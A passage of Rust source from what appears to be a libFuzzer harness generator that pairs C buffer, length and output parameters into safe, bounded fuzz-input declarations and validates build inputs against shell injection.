/// `(const char *src, int srclen)` still pairs (`srclen` is count-shaped).
pub(crate) fn looks_like_buffer_name(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    matches!(
        n.as_str(),
        "buf"
            | "buffer"
            | "data"
            | "src"
            | "source"
            | "in"
            | "input"
            | "ptr"
            | "p"
            | "s"
            | "str"
            | "string"
            | "bytes"
            | "text"
            | "msg"
            | "message"
            | "content"
            | "payload"
            | "mem"
            | "raw"
    ) || n.contains("buf")
        || n.contains("data")
        || n.ends_with("src")
        || n.ends_with("str")
        || n.contains("bytes")
        || n.contains("input")
}

fn is_length_scalar_base(base: &str) -> bool {
    matches!(
        base,
        "size_t"
            | "ssize_t"
            | "int"
            | "unsigned"
            | "unsigned int"
            | "long"
            | "unsigned long"
            | "uLong"
            | "uLongf"
            | "uInt"
            | "z_size_t"
            | "mz_ulong"
    )
}

fn canonical_c_type(c_type: &str) -> String {
    c_type
        .replace('*', " * ")
        .split_whitespace()
        .map(|token| if token == "z_const" { "const" } else { token })
        .filter(|token| !matches!(*token, "FAR" | "ZEXPORT" | "ZEXTERN"))
        .collect::<Vec<_>>()
        .join(" ")
}

fn emit_c_type(c_type: &str) -> String {
    c_type
        .replace('*', " * ")
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

fn pointer_base(c_type: &str) -> Option<&str> {
    c_type
        .strip_suffix(" *")
        .map(str::trim)
        .filter(|base| !base.contains('*'))
}

fn is_const_pointer_type(canonical_c_type: &str) -> bool {
    pointer_base(canonical_c_type)
        .is_some_and(|base| base.split_whitespace().any(|token| token == "const"))
}

/// Emit a `(buf_ptr, length)` pair backed by the fuzz input.
///
/// A `const` buffer is read-only, so it aliases libFuzzer's `Data+Size` span
/// directly (nothing to free). A *non-const* buffer may be written by the
/// callee — and writing into libFuzzer's `Data` aborts the run
/// ("fuzz target overwrites its const input", which left every such target
/// at 0 fuzz executions, e.g. cwalk's `cwk_path_join(..., char *buffer,
/// size_t buffer_size)`). So allocate a writable buffer with output headroom
/// and seed it with the fuzz bytes, keeping input/in-out buffers fuzz-driven
/// while output buffers have room to write.
/// A NUL-terminated-mode marker in an enum member name (utf8proc's
/// `UTF8PROC_NULLTERM`): a flag value that makes the callee IGNORE its length
/// argument and read the buffer until a NUL byte. Matched on the UPPER-cased name
/// so casing variants are covered; the markers are specific enough that a benign
/// collision is implausible.
fn enum_member_is_nul_terminated_marker(member: &str) -> bool {
    let u = member.to_ascii_uppercase();
    [
        "NULLTERM",
        "NUL_TERM",
        "NULTERM",
        "NUL_TERMINATED",
        "NULL_TERMINATED",
        "ZEROTERM",
        "ZERO_TERM",
        "ZERO_TERMINATED",
    ]
    .iter()
    .any(|m| u.contains(m))
}

/// True when the function takes an enum/flags PARAMETER whose enum carries a
/// NUL-terminated-mode value (so a fuzzed `options` can select "read until NUL,
/// ignoring the length"). This is the precise, non-regressing gate for #468: only
/// such a function's const input buffer is NUL-terminated; every other
/// length-delimited parser keeps the zero-copy, ASan-redzone-backed `(T*)Data`.
fn function_selects_nul_terminated_mode(
    params: &[CParameter],
    type_defs: &[c_parser::CTypeDefs],
) -> bool {
    // Enum tags that carry a NUL-term marker (`utf8proc_option_t`).
    let mut nul_enums: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for defs in type_defs {
        for e in &defs.enums {
            if e.members
                .iter()
                .any(|m| enum_member_is_nul_terminated_marker(m))
            {
                nul_enums.insert(e.name.as_str());
            }
        }
    }
    if nul_enums.is_empty() {
        return false;
    }
    // A typedef may alias the param's type to `enum X` (`typedef enum X Y`).
    let resolve_to_enum = |name: &str| -> Option<String> {
        for defs in type_defs {
            for t in &defs.typedefs {
                if t.name == name {
                    return Some(
                        t.underlying
                            .trim()
                            .trim_start_matches("enum ")
                            .trim()
                            .to_owned(),
                    );
                }
            }
        }
        None
    };
    params.iter().any(|p| {
        // Strip const/pointer/`enum ` decoration to the bare type tag.
        let base = p
            .c_type
            .replace('*', " ")
            .replace("const", " ")
            .replace("enum", " ");
        let base = base.split_whitespace().next_back().unwrap_or("");
        nul_enums.contains(base)
            || resolve_to_enum(base).is_some_and(|e| nul_enums.contains(e.as_str()))
    })
}

fn pair_buffer_length(
    buffer: &CParameter,
    length: &CParameter,
    nul_terminate: bool,
) -> (CParamEmission, CParamEmission) {
    let buf_type = emit_c_type(&buffer.c_type);
    let buf_name = &buffer.name;
    let len_name = &length.name;
    let len_type = emit_c_type(&length.c_type);

    if is_const_pointer_type(&canonical_c_type(&buffer.c_type)) {
        // #468: when the function exposes a NUL-terminated MODE (a sibling enum
        // flag like `UTF8PROC_NULLTERM` that makes the callee ignore the length and
        // read until a NUL), the raw libFuzzer `Data` span — which is NOT
        // NUL-terminated — would be over-read. Pass a NUL-terminated COPY: a
        // length-delimited read sees the same `Size` bytes (the trailing NUL is
        // never reached), and a NUL-mode read stops at `[Size]`. Done ONLY for such
        // functions; every other const input buffer keeps the zero-copy
        // `(T*)Data`, whose ASan redzone at `[Size]` still catches a genuine
        // over-read past the declared length (no real-bug-detection regression).
        if nul_terminate {
            let copy = format!("_gf_ntbuf_{buf_name}");
            let copy_len = format!("_gf_ntlen_{buf_name}");
            let buf_decl = format!(
                "size_t {copy_len} = Size <= (1024 * 1024) ? (size_t)Size : (1024 * 1024); \
                 char *{copy} = (char *)malloc({copy_len} + 1); \
                 if ({copy}) {{ if ({copy_len}) memcpy({copy}, Data, {copy_len}); {copy}[{copy_len}] = 0; }} \
                 {buf_type} {buf_name} = ({buf_type}){copy}"
            );
            let buf_emission = CParamEmission {
                support: None,
                decl: buf_decl,
                arg: buf_name.to_owned(),
                c_type: buf_type,
                free: Some(format!("free({copy})")),
            };
            let len_emission = CParamEmission {
                support: None,
                decl: format!("{len_type} {len_name} = ({len_type})({copy} ? {copy_len} : 0)"),
                arg: len_name.to_owned(),
                c_type: len_type,
                free: None,
            };
            return (buf_emission, len_emission);
        }
        let buf_decl = format!("{buf_type} {buf_name} = ({buf_type})Data");
        let buf_emission = CParamEmission {
            support: None,
            decl: buf_decl,
            arg: buf_name.to_owned(),
            c_type: buf_type,
            free: None,
        };
        let len_emission = CParamEmission {
            support: None,
            decl: format!("{len_type} {len_name} = ({len_type})Size"),
            arg: len_name.to_owned(),
            c_type: len_type,
            free: None,
        };
        return (buf_emission, len_emission);
    }

    let cap_name = format!("_gf_cap_{buf_name}");
    let buf_decl = format!(
        "size_t {cap_name} = Size <= (1024 * 1024) ? (size_t)Size : (1024 * 1024); \
         {buf_type} {buf_name} = ({buf_type})malloc({cap_name} ? {cap_name} : 1); \
         if ({buf_name} && {cap_name}) memcpy({buf_name}, Data, {cap_name})"
    );
    let buf_emission = CParamEmission {
        support: None,
        decl: buf_decl,
        arg: buf_name.to_owned(),
        c_type: buf_type,
        free: Some(format!("free({buf_name})")),
    };
    let len_emission = CParamEmission {
        support: None,
        decl: format!("{len_type} {len_name} = ({len_type})({buf_name} ? {cap_name} : 0)"),
        arg: len_name.to_owned(),
        c_type: len_type,
        free: None,
    };
    (buf_emission, len_emission)
}

/// Emit a `(typed_array, element_count)` pair: allocate `count` zero-initialised
/// elements and pass that same `count`, so the callee's array and its declared
/// length agree. `T *p = calloc(n, sizeof *p)` is the idiomatic sizing (works for
/// `const` elements; the `(void *)` free cast drops the const). The count is
/// drawn from the cursor — not the libFuzzer `Data` span — so this pairing does
/// NOT consume `Data`/`Size` and may apply more than once per harness.
fn pair_typed_array_count(
    array: &CParameter,
    count: &CParameter,
) -> (CParamEmission, CParamEmission) {
    let arr_type = emit_c_type(&array.c_type);
    let arr_name = &array.name;
    let count_type = emit_c_type(&count.c_type);
    let count_name = &count.name;
    let n_name = format!("_gf_n_{arr_name}");

    let arr_decl = format!(
        "size_t {n_name} = gf_bounded_length(&Cur, 0, 64); \
         {arr_type} {arr_name} = ({arr_type})calloc({n_name} ? {n_name} : 1, sizeof(*{arr_name}))"
    );
    let arr_emission = CParamEmission {
        support: None,
        decl: arr_decl,
        arg: arr_name.to_owned(),
        c_type: arr_type,
        free: Some(format!("free((void *){arr_name})")),
    };

    let count_decl =
        format!("{count_type} {count_name} = ({count_type})({arr_name} ? {n_name} : 0)");
    let count_emission = CParamEmission {
        support: None,
        decl: count_decl,
        arg: count_name.to_owned(),
        c_type: count_type,
        free: None,
    };
    (arr_emission, count_emission)
}

/// Reverse-order counterpart of [`pair_typed_array_count`]: `(count, T *array)`.
/// The first emission owns both declarations because the generated call argument
/// list must retain source order; the second carries the array argument and its
/// cleanup without redeclaring the storage.
fn pair_reverse_typed_array_count(
    count: &CParameter,
    array: &CParameter,
) -> (CParamEmission, CParamEmission) {
    let count_type = emit_c_type(&count.c_type);
    let count_name = &count.name;
    let arr_type = emit_c_type(&array.c_type);
    let arr_name = &array.name;
    let n_name = format!("_gf_n_{arr_name}");
    let count_decl = format!(
        "size_t {n_name} = gf_bounded_length(&Cur, 0, 64); \
         {arr_type} {arr_name} = ({arr_type})calloc({n_name} ? {n_name} : 1, sizeof(*{arr_name})); \
         {count_type} {count_name} = ({count_type})({arr_name} ? {n_name} : 0)"
    );
    (
        CParamEmission {
            support: None,
            decl: count_decl,
            arg: count_name.to_owned(),
            c_type: count_type,
            free: None,
        },
        CParamEmission {
            support: None,
            decl: "/* backing array declared with its preceding count */".to_owned(),
            arg: arr_name.to_owned(),
            c_type: arr_type,
            free: Some(format!("free((void *){arr_name})")),
        },
    )
}

/// Emit a `(char **strings, count)` pair: allocate `count` decoded NUL-terminated
/// strings into a `[const] char *[]` and pass that same `count`, so the callee's
/// array and its length agree (cJSON `cJSON_CreateStringArray`). Draws the count
/// from the cursor, not `Data`/`Size`.
fn pair_string_array_count(
    array: &CParameter,
    count: &CParameter,
) -> (CParamEmission, CParamEmission) {
    let is_const = crate::c_decoders::char_double_pointer_constness(&array.c_type).unwrap_or(true);
    let elem = if is_const { "const char" } else { "char" };
    let arr_name = &array.name;
    let count_type = emit_c_type(&count.c_type);
    let count_name = &count.name;
    let n = format!("_gf_n_{arr_name}");
    let actual = format!("_gf_count_{arr_name}");
    let i = format!("_gf_i_{arr_name}");

    let arr_decl = format!(
        "size_t {n} = gf_bounded_length(&Cur, 0, 16); \
         {elem} **{arr_name} = ({elem} **)calloc({n} ? {n} : 1, sizeof({elem} *)); \
         size_t {actual} = 0; \
         for (size_t {i} = 0; {arr_name} && {i} < {n}; ++{i}) {{ \
             {arr_name}[{i}] = gf_c_string(&Cur, 256); \
             if (!{arr_name}[{i}]) break; \
             {actual}++; \
         }}"
    );
    let arr_emission = CParamEmission {
        support: None,
        decl: arr_decl,
        arg: arr_name.to_owned(),
        c_type: format!("{elem} **"),
        free: Some(format!(
            "if ({arr_name}) {{ for (size_t {i} = 0; {i} < {n}; ++{i}) free((void *){arr_name}[{i}]); free((void *){arr_name}); }}"
        )),
    };
    let count_decl = format!("{count_type} {count_name} = ({count_type}){actual}");
    let count_emission = CParamEmission {
        support: None,
        decl: count_decl,
        arg: count_name.to_owned(),
        c_type: count_type,
        free: None,
    };
    (arr_emission, count_emission)
}

fn looks_like_plural_file_path_name(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    name.contains("filenames")
        || name.contains("file_names")
        || name == "files"
        || name.ends_with("_files")
        || name == "paths"
        || name.ends_with("_paths")
}

/// Decode a NULL-terminated vector of file paths as one fuzz-backed temp file.
/// Supports both narrow and wide public path APIs; the generated temp path is
/// ASCII, so widening its bytes is locale-independent.
fn file_path_array_param(param: &CParameter) -> Option<CParamEmission> {
    let canonical = canonical_c_type(&param.c_type);
    let stars = canonical
        .split_whitespace()
        .filter(|token| *token == "*")
        .count();
    if stars != 2 {
        return None;
    }
    let wide = canonical.split_whitespace().any(|token| token == "wchar_t");
    let narrow = canonical.split_whitespace().any(|token| token == "char");
    if !wide && !narrow {
        return None;
    }

    let name = &param.name;
    let ty = emit_c_type(&param.c_type);
    let path = format!("_gf_path_{name}");
    let made = format!("_gf_path_made_{name}");
    let storage = format!("_gf_paths_{name}");
    let decl = if wide {
        let wide_path = format!("_gf_wpath_{name}");
        let index = format!("_gf_wpath_i_{name}");
        format!(
            "char {path}[gf_tempfile_path_len]; \
             const char *{made} = gf_make_tempfile(Data, Size, {path}); \
             wchar_t {wide_path}[gf_tempfile_path_len]; \
             size_t {index} = 0; \
             if ({made}) {{ \
                 while ({index} + 1 < gf_tempfile_path_len && {path}[{index}]) {{ \
                     {wide_path}[{index}] = (wchar_t)(unsigned char){path}[{index}]; \
                     {index}++; \
                 }} \
             }} \
             {wide_path}[{index}] = 0; \
             const wchar_t *{storage}[2] = {{ {wide_path}, NULL }}; \
             {ty} {name} = ({ty}){storage}"
        )
    } else {
        format!(
            "char {path}[gf_tempfile_path_len]; \
             const char *{made} = gf_make_tempfile(Data, Size, {path}); \
             const char *{storage}[2] = {{ {made} ? {path} : \"\", NULL }}; \
             {ty} {name} = ({ty}){storage}"
        )
    };
    Some(CParamEmission {
        support: None,
        decl,
        arg: name.to_owned(),
        c_type: ty,
        free: Some(format!("if ({made}) unlink({path})")),
    })
}

fn pair_output_buffer_capacity(
    buffer: &CParameter,
    length: &CParameter,
    function_name: &str,
) -> (CParamEmission, CParamEmission) {
    let buf_type = emit_c_type(&buffer.c_type);
    let len_type = emit_c_type(&length.c_type);
    let buf_name = &buffer.name;
    let len_name = &length.name;
    let cap_name = format!("_gf_cap_{buf_name}");

    let capacity = output_buffer_capacity_expression(function_name);
    let buf_decl = format!(
        "size_t {cap_name} = {capacity}; \
         {buf_type} {buf_name} = ({buf_type})malloc({cap_name} ? {cap_name} : 1)"
    );
    let buf_emission = CParamEmission {
        support: None,
        decl: buf_decl,
        arg: buf_name.to_owned(),
        c_type: buf_type,
        free: Some(format!("free({buf_name})")),
    };
    // Allocation failure must not leave a non-zero advertised capacity beside
    // NULL. Passing `(NULL, 65536)` turns ordinary memory pressure into a target
    // crash that the harness manufactured itself.
    let len_decl = format!("{len_type} {len_name} = ({len_type})({buf_name} ? {cap_name} : 0)");
    let len_emission = CParamEmission {
        support: None,
        decl: len_decl,
        arg: len_name.to_owned(),
        c_type: len_type,
        free: None,
    };
    (buf_emission, len_emission)
}

fn output_buffer_capacity_expression(function_name: &str) -> &'static str {
    let lower = function_name.to_ascii_lowercase();
    if lower.contains("decompress") || lower.contains("uncompress") || lower.contains("inflate") {
        // One-shot decompressors routinely expand tiny inputs by orders of
        // magnitude. A Size-relative output allocation rejects structurally
        // valid compressed seeds before their block loops run. One MiB matches
        // the bounded expert-harness convention used by OSS-Fuzz-style targets
        // without permitting decompression bombs to grow without limit.
        "1024 * 1024"
    } else {
        "Size < (1024 * 1024) ? Size + 65536 : (1024 * 1024 + 65536)"
    }
}

fn looks_like_reverse_input_length_buffer_pair(length: &CParameter, buffer: &CParameter) -> bool {
    looks_like_count_name(&length.name)
        && (looks_like_buffer_name(&buffer.name)
            || shared_parameter_stem(&length.name, &buffer.name))
}

fn looks_like_reverse_output_length_buffer_pair(
    length: &CParameter,
    buffer: &CParameter,
    function_name: &str,
) -> bool {
    looks_like_count_name(&length.name)
        && looks_like_output_producing_function(function_name)
        && (looks_outputish(&length.name)
            || looks_outputish(&buffer.name)
            || shared_parameter_stem(&length.name, &buffer.name))
}

fn shared_parameter_stem(left: &str, right: &str) -> bool {
    fn stems(name: &str) -> impl Iterator<Item = &str> {
        name.split('_').filter(|part| {
            !part.is_empty()
                && !matches!(
                    part.to_ascii_lowercase().as_str(),
                    "size" | "len" | "length" | "count" | "buffer" | "buf" | "data" | "ptr"
                )
        })
    }
    stems(left)
        .any(|left_stem| stems(right).any(|right_stem| left_stem.eq_ignore_ascii_case(right_stem)))
}

fn pair_input_length_buffer(
    length: &CParameter,
    buffer: &CParameter,
) -> (CParamEmission, CParamEmission) {
    let len_type = emit_c_type(&length.c_type);
    let buf_type = emit_c_type(&buffer.c_type);
    (
        CParamEmission {
            support: None,
            decl: format!("{len_type} {} = ({len_type})Size", length.name),
            arg: length.name.clone(),
            c_type: len_type,
            free: None,
        },
        CParamEmission {
            support: None,
            decl: format!("{buf_type} {} = ({buf_type})Data", buffer.name),
            arg: buffer.name.clone(),
            c_type: buf_type,
            free: None,
        },
    )
}

fn pair_output_length_buffer(
    length: &CParameter,
    buffer: &CParameter,
    function_name: &str,
) -> (CParamEmission, CParamEmission) {
    let len_type = emit_c_type(&length.c_type);
    let len_base = pointer_base(&len_type)
        .expect("caller checked length pointer")
        .to_owned();
    let buf_type = emit_c_type(&buffer.c_type);
    let cap_name = format!("_gf_cap_{}", buffer.name);
    let len_storage = format!("_gf_out_{}", length.name);
    let capacity = output_buffer_capacity_expression(function_name);
    let declaration = format!(
        "size_t {cap_name} = {capacity}; \
         {buf_type} {} = ({buf_type})malloc({cap_name} ? {cap_name} : 1); \
         {len_base} {len_storage} = ({len_base})({} ? {cap_name} : 0); \
         {len_base} *{} = &{len_storage}",
        buffer.name, buffer.name, length.name
    );
    (
        CParamEmission {
            support: None,
            decl: declaration,
            arg: length.name.clone(),
            c_type: len_type,
            free: None,
        },
        CParamEmission {
            support: None,
            decl: String::new(),
            arg: buffer.name.clone(),
            c_type: buf_type,
            free: Some(format!("free({})", buffer.name)),
        },
    )
}

fn looks_like_output_capacity_pair(
    buffer: &CParameter,
    length: &CParameter,
    function_name: &str,
) -> bool {
    looks_outputish(&buffer.name)
        || looks_outputish(&length.name)
        // Public headers often omit parameter names. The parser then gives us
        // `arg1`/`arg2`, so name-only evidence disappears precisely for APIs like
        // `archive_read_data(struct archive *, void *, size_t)`. Decoding that
        // writable buffer and capacity independently can pass a 64 KiB length
        // with a one-byte allocation and manufacture a harness-side ASan crash.
        // Restrict the structural fallback to strongly output-producing API
        // names; a generic unnamed `(void *, size_t)` can just as easily be an
        // input buffer and must not be rewritten as output.
        || (is_synthetic_param_name(&buffer.name)
            && is_synthetic_param_name(&length.name)
            && looks_like_output_producing_function(function_name))
}

fn is_synthetic_param_name(name: &str) -> bool {
    // Sequence emission scopes every name (`_gf_step5_arg1`), so inspect the
    // final component as well as the direct-harness spelling (`arg1` or
    // `_gf_arg1`).
    let leaf = name.rsplit('_').next().unwrap_or(name);
    let mut stem = leaf.trim_start_matches('_');
    if let Some(rest) = stem.strip_prefix("gf_") {
        stem = rest;
    }
    stem.strip_prefix("arg")
        .is_some_and(|digits| !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit()))
}

fn looks_like_output_producing_function(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    lower == "read"
        || lower.starts_with("read_")
        || lower.contains("_read_")
        || lower.ends_with("_read")
        || lower.starts_with("fread")
        || lower.starts_with("pread")
        || lower.contains("recv")
        || lower.contains("receive")
        || lower.contains("decode")
        || lower.contains("decompress")
        || lower.contains("uncompress")
        || lower.contains("inflate")
        || lower.contains("extract")
}

fn looks_like_explicit_binary_pointer(c_type: &str) -> bool {
    let compact = c_type
        .to_ascii_lowercase()
        .split_whitespace()
        .collect::<String>();
    compact.contains("void*")
        || compact.contains("uint8_t*")
        || compact.contains("int8_t*")
        || compact.contains("unsignedchar*")
        || compact.contains("std::byte*")
}

pub(crate) fn looks_like_in_memory_input_function(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    lower.contains("memory")
        || lower.contains("_mem_")
        || lower.ends_with("_mem")
        || lower.contains("buffer")
        || lower.ends_with("_bytes")
        || lower.contains("write_data")
        || lower.contains("send_data")
}

fn is_nullable_memory_metadata_param(param: &CParameter) -> bool {
    let c_type = canonical_c_type(&param.c_type).to_ascii_lowercase();
    let is_const_char_pointer =
        c_type.contains('*') && (c_type.contains("const char") || c_type.contains("char const"));
    if !is_const_char_pointer {
        return false;
    }
    let name = param.name.to_ascii_lowercase();
    matches!(
        name.as_str(),
        "url"
            | "uri"
            | "base_url"
            | "base_uri"
            | "document_url"
            | "document_uri"
            | "encoding"
            | "charset"
            | "character_encoding"
    )
}

fn looks_outputish(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    lower.contains("out")
        || lower.contains("output")
        || lower.contains("dest")
        || lower.contains("dst")
}

/// An untrusted INPUT buffer paired with a length POINTER (`mz_uncompress2`'s
/// `const unsigned char *pSource, mz_ulong *pSource_len`). Like
/// [`pair_buffer_length`] but the length is passed by pointer: bind `*length` to
/// the buffer's actual size (`Size`) instead of fuzzing it, so the callee never
/// reads past the buffer (a spurious heap-buffer-overflow otherwise).
fn pair_input_buffer_length_pointer(
    buffer: &CParameter,
    length: &CParameter,
) -> (CParamEmission, CParamEmission) {
    let buf_type = emit_c_type(&buffer.c_type);
    let buf_name = &buffer.name;
    let len_type = emit_c_type(&length.c_type);
    let len_base = pointer_base(&len_type)
        .expect("caller checked length pointer")
        .to_owned();
    let len_name = &length.name;
    let len_storage = format!("_gf_in_{len_name}");
    if is_const_pointer_type(&canonical_c_type(&buffer.c_type)) {
        let buf_emission = CParamEmission {
            support: None,
            decl: format!("{buf_type} {buf_name} = ({buf_type})Data"),
            arg: buf_name.to_owned(),
            c_type: buf_type,
            free: None,
        };
        let len_emission = CParamEmission {
            support: None,
            decl: format!(
                "{len_base} {len_storage} = ({len_base})Size; {len_base} *{len_name} = &{len_storage}"
            ),
            arg: len_name.to_owned(),
            c_type: len_type,
            free: None,
        };
        return (buf_emission, len_emission);
    }

    let cap_name = format!("_gf_cap_{buf_name}");
    let buf_emission = CParamEmission {
        support: None,
        decl: format!(
            "size_t {cap_name} = Size <= (1024 * 1024) ? (size_t)Size : (1024 * 1024); \
             {buf_type} {buf_name} = ({buf_type})malloc({cap_name} ? {cap_name} : 1); \
             if ({buf_name} && {cap_name}) memcpy({buf_name}, Data, {cap_name})"
        ),
        arg: buf_name.to_owned(),
        c_type: buf_type,
        free: Some(format!("free({buf_name})")),
    };
    let len_emission = CParamEmission {
        support: None,
        decl: format!(
            "{len_base} {len_storage} = ({len_base})({buf_name} ? {cap_name} : 0); {len_base} *{len_name} = &{len_storage}"
        ),
        arg: len_name.to_owned(),
        c_type: len_type,
        free: None,
    };
    (buf_emission, len_emission)
}

/// Whether two adjacent parameters are the `[begin, end)` bounds of ONE buffer.
///
/// Requires identical const byte-pointer spellings — a pair that brackets a
/// buffer is always the same type at both ends — plus an end-sentinel name on
/// the second. Name evidence is required because `(const char *a, const char *b)`
/// is just as often two unrelated strings (`strcmp`).
fn is_begin_end_pointer_pair(begin: &CParameter, end: &CParameter) -> bool {
    let begin_type = emit_c_type(&begin.c_type);
    let end_type = emit_c_type(&end.c_type);
    if begin_type != end_type || !is_const_byte_pointer_spelling(&begin_type) {
        return false;
    }
    let end_name = end.name.trim().to_ascii_lowercase();
    let is_end_sentinel = matches!(
        end_name.as_str(),
        "end" | "endptr" | "end_ptr" | "e" | "limit" | "last" | "stop" | "tail" | "finish"
    ) || end_name.ends_with("_end")
        || end_name.ends_with("end");
    let begin_name = begin.name.trim().to_ascii_lowercase();
    let is_begin = matches!(
        begin_name.as_str(),
        "ptr" | "p" | "s" | "start" | "begin" | "buf" | "buffer" | "data" | "cur" | "first"
    ) || begin_name.ends_with("_start")
        || begin_name.ends_with("_begin")
        || begin_name.ends_with("ptr");
    is_end_sentinel && is_begin
}

/// `const char *` / `const unsigned char *` / `const uint8_t *` and friends.
fn is_const_byte_pointer_spelling(spelling: &str) -> bool {
    let normalized = spelling.split_whitespace().collect::<Vec<_>>().join(" ");
    matches!(
        normalized.as_str(),
        "const char *"
            | "const unsigned char *"
            | "const signed char *"
            | "const uint8_t *"
            | "const int8_t *"
            | "const void *"
    )
}

/// Bind both ends of a `[begin, end)` pair to the single libFuzzer span, so the
/// callee's walk stays inside one live allocation.
fn pair_begin_end_span(begin: &CParameter, end: &CParameter) -> (CParamEmission, CParamEmission) {
    let ty = emit_c_type(&begin.c_type);
    let begin_name = &begin.name;
    let end_name = &end.name;
    (
        CParamEmission {
            support: None,
            decl: format!("{ty} {begin_name} = ({ty})Data"),
            arg: begin_name.clone(),
            c_type: ty.clone(),
            free: None,
        },
        CParamEmission {
            support: None,
            decl: format!("{ty} {end_name} = ({ty})Data + Size"),
            arg: end_name.clone(),
            c_type: ty,
            free: None,
        },
    )
}

fn pair_output_buffer_length(
    buffer: &CParameter,
    length: &CParameter,
    function_name: &str,
) -> (CParamEmission, CParamEmission) {
    let buf_type = emit_c_type(&buffer.c_type);
    let len_type = emit_c_type(&length.c_type);
    let len_base = pointer_base(&len_type)
        .expect("caller checked length pointer")
        .to_owned();
    let buf_name = &buffer.name;
    let len_name = &length.name;
    let cap_name = format!("_gf_cap_{buf_name}");
    let len_storage = format!("_gf_out_{len_name}");

    let capacity = output_buffer_capacity_expression(function_name);
    let buf_decl = format!(
        "size_t {cap_name} = {capacity}; \
         {buf_type} {buf_name} = ({buf_type})malloc({cap_name} ? {cap_name} : 1)"
    );
    let buf_emission = CParamEmission {
        support: None,
        decl: buf_decl,
        arg: buf_name.to_owned(),
        c_type: buf_type,
        free: Some(format!("free({buf_name})")),
    };
    let len_decl = format!(
        "{len_base} {len_storage} = ({len_base})({buf_name} ? {cap_name} : 0); {len_base} *{len_name} = &{len_storage}"
    );
    let len_emission = CParamEmission {
        support: None,
        decl: len_decl,
        arg: len_name.to_owned(),
        c_type: len_type,
        free: None,
    };
    (buf_emission, len_emission)
}

/// Refuse untrusted build inputs (flags, source paths, include dirs)
/// containing shell/make metacharacters before they reach the
/// Makefile template — these would otherwise be command injection at
/// `make` time. `target_includes` are validated too because a header
/// name with an embedded quote could break out of the `#include "..."`
/// line in the generated harness source.
fn validate_c_build_inputs(args: &GenerateCDirectArgs) -> Result<(), HarnessGenError> {
    use crate::build_safety::{
        ensure_all_build_inputs_safe, ensure_all_compile_flags_safe, ensure_build_input_safe,
    };
    // Flags are recipe-only, so one that is safe once single-quoted is allowed;
    // paths and include names below stay strict (a path is also a make target).
    ensure_all_compile_flags_safe(args.compile_flags.iter().map(String::as_str))?;
    ensure_all_build_inputs_safe(
        "include name",
        args.target_includes.iter().map(String::as_str),
    )?;
    for dir in &args.target_includes_dirs {
        ensure_build_input_safe("include dir", &dir.display().to_string())?;
    }
    for src in &args.target_sources {
        ensure_build_input_safe("source path", &src.display().to_string())?;
    }
    ensure_build_input_safe(
        "runtime include",
        &args.c_runtime_include.display().to_string(),
    )?;
    Ok(())
}

fn validate_c_sequence_build_inputs(args: &GenerateCSequenceArgs) -> Result<(), HarnessGenError> {
    use crate::build_safety::{
        ensure_all_build_inputs_safe, ensure_all_compile_flags_safe, ensure_build_input_safe,
    };
    // Flags are recipe-only, so one that is safe once single-quoted is allowed;
    // paths and include names below stay strict (a path is also a make target).
    ensure_all_compile_flags_safe(args.compile_flags.iter().map(String::as_str))?;
    ensure_all_build_inputs_safe(
        "include name",
        args.target_includes.iter().map(String::as_str),
    )?;
    for dir in &args.target_includes_dirs {
        ensure_build_input_safe("include dir", &dir.display().to_string())?;
    }
    for src in &args.target_sources {
        ensure_build_input_safe("source path", &src.display().to_string())?;
    }
    ensure_build_input_safe(
        "runtime include",
        &args.c_runtime_include.display().to_string(),
    )?;
    Ok(())
}

/// Bind WebP's interleaved decode-into output geometry to the encoded image.
///
/// The family has a stable five-argument contract:
/// `(encoded, encoded_size, output, output_capacity, output_stride)`. Its public
/// `WebPGetInfo` sibling returns the two dimensions needed to derive the final
/// three arguments. Keeping this as a narrow declaration-shaped recipe avoids
/// guessing that an arbitrary `stride` parameter is pixel geometry.
fn bind_webp_interleaved_output_geometry(
    target_name: &str,
    source_params: &[CParameter],
    registry: &TypeRegistry,
    emissions: &mut [CParamEmission],
) {
    let bytes_per_pixel = match target_name {
        "WebPDecodeRGBInto" | "WebPDecodeBGRInto" => 3,
        "WebPDecodeRGBAInto" | "WebPDecodeARGBInto" | "WebPDecodeBGRAInto" => 4,
        _ => return,
    };
    if source_params.len() != 5
        || emissions.len() != 5
        || !is_raw_buffer_param(&source_params[0].c_type, registry)
        || !(is_length_param(&source_params[1].c_type)
            || registry_resolves_to_length(&source_params[1].c_type, registry))
        || !is_output_buffer_param(&source_params[2].c_type, registry)
        || !(is_length_param(&source_params[3].c_type)
            || registry_resolves_to_length(&source_params[3].c_type, registry))
        || source_params[4].c_type.contains('*')
        || !matches!(
            registry.resolve(&source_params[4].c_type),
            TypeShape::Scalar(_)
        )
    {
        return;
    }

    let input = emissions[0].arg.clone();
    let input_size = emissions[1].arg.clone();
    let output = emissions[2].arg.clone();
    let output_type = emissions[2].c_type.clone();
    let capacity = emissions[3].arg.clone();
    let capacity_type = emissions[3].c_type.clone();
    let stride = emissions[4].arg.clone();
    let stride_type = emissions[4].c_type.clone();

    emissions[2].decl = format!(
        "int _gf_image_width = 0; int _gf_image_height = 0; \
         int _gf_image_geometry_valid = WebPGetInfo({input}, {input_size}, \
             &_gf_image_width, &_gf_image_height) && \
             _gf_image_width > 0 && _gf_image_height > 0 && \
             _gf_image_width <= 4096 && _gf_image_height <= 4096; \
         size_t _gf_image_stride = 0; size_t _gf_image_capacity = 0; \
         if (_gf_image_geometry_valid) {{ \
             _gf_image_stride = (size_t)_gf_image_width * {bytes_per_pixel}u; \
             if ((size_t)_gf_image_height <= (16u << 20) / _gf_image_stride) \
                 _gf_image_capacity = _gf_image_stride * (size_t)_gf_image_height; \
             else _gf_image_geometry_valid = 0; \
         }} \
         size_t _gf_generic_capacity = Size < (1024 * 1024) ? \
             Size + 65536 : (1024 * 1024 + 65536); \
         size_t _gf_output_capacity = _gf_image_geometry_valid ? \
             _gf_image_capacity : _gf_generic_capacity; \
         {output_type} {output} = ({output_type})malloc(\
             _gf_output_capacity ? _gf_output_capacity : 1)"
    );
    emissions[3].decl = format!(
        "{capacity_type} {capacity} = ({capacity_type})(\
         {output} ? _gf_output_capacity : 0)"
    );
    emissions[4].decl = format!(
        "{stride_type} {stride} = _gf_image_geometry_valid ? \
